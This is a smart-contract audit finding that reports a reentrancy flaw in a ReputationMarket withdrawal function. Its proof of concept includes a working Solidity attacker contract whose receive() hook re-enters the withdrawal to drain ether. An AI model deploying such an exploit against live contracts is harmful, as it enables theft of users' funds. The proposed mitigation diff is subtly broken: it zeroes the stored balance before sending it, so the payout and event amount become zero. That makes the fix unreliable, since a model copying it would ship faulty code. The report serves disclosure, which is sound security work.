# ReputationMarket::withdrawGraduatedMarketFunds is vulnerable to reentrancy and contract can be drained

### Summary

The following public function is vulnerable reentrancy.
https://github.com/sherlock-audit/2024-11-ethos-network-ii/blob/main/ethos/packages/contracts/contracts/ReputationMarket.sol#L660-L678

### Root Cause

The problem is that the function does not CEI pattern and the storage is updated last on line#677
https://github.com/sherlock-audit/2024-11-ethos-network-ii/blob/main/ethos/packages/contracts/contracts/ReputationMarket.sol#L677

### Internal pre-conditions

The address approved with the `GRADUATION_WITHDRAWAL` permission has to to malicious. The address is trusted to graduate market and withdraw graduated funds. However, due to the vulnerability the address can drain the entire contract of ether which is severe since the funds for all voting markets are stored in the `ReputationMarket` contract.

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

The contract can be drained of all funds.

### PoC

This is a textbook reentrancy vulnerability but proof and for the sake of simplicity run the following test in remix
Here is the vulnerable function:
https://github.com/sherlock-audit/2024-11-ethos-network-ii/blob/main/ethos/packages/contracts/contracts/ReputationMarket.sol#L660C1-L678C4

Run the following test in Remix
1. First deploy the `ReentrantFunction` contract
2. Deploy the `MaliciousGraduatedMarketManager` contract
3. Call `ReentrantFunction::setUpTest` with 10 ether
4. Call the `MaliciousGraduatedMarketManager::attack` function
5.  `MaliciousGraduatedMarketManager` contract will end up with 9 ether

** Note **
The `profileId = 1` and it legitimately has 1 ether of funds that  need to be withdrawn. For simplicity code was commented out but it does not prevent the reentrancy since they don't update contract state.

```solidity
// SPDX-License-Identifier: MIT

contract ReentrantFunction {
    mapping(uint256 profileId => uint256 funds) public marketFunds;
//send the function 10 ether to setup the test
    function setUpTest() payable public {
        uint256 profileId = 1;
        marketFunds[profileId] = 1 ether;
    }

 function withdrawGraduatedMarketFunds(uint256 profileId) public /* whenNotPaused */ {
   /*  address authorizedAddress = contractAddressManager.getContractAddressForName(
      "GRADUATION_WITHDRAWAL"
    );
    if (msg.sender != authorizedAddress) {
      revert UnauthorizedWithdrawal();
    }
    _checkMarketExists(profileId);
    if (!graduatedMarkets[profileId]) {
      revert MarketNotGraduated();
    }
    if (marketFunds[profileId] == 0) {
      revert InsufficientFunds();
    } */

    _sendEth(marketFunds[profileId]);
    //emit MarketFundsWithdrawn(profileId, msg.sender, marketFunds[profileId]);
    marketFunds[profileId] = 0;
  }

   function _sendEth(uint256 amount) private {
        (bool success,) = payable(msg.sender).call{value: amount}("");
        require(success, "ETH transfer failed");
    }
}

contract MaliciousGraduatedMarketManager{
     ReentrantFunction repMarket;

    constructor(address _repMarket ){
        repMarket = ReentrantFunction(_repMarket);
    }

    function attack() external {
        repMarket.withdrawGraduatedMarketFunds(1);
    }

    receive() payable external{
        if(address(repMarket).balance > 1 ether){
            repMarket.withdrawGraduatedMarketFunds(1);
        }
    }
}


```

### Mitigation

Make the following changes:

```diff
+   marketFunds[profileId] = 0;
    _sendEth(marketFunds[profileId]);
    emit MarketFundsWithdrawn(profileId, msg.sender, marketFunds[profileId]);
-    marketFunds[profileId] = 0;
```
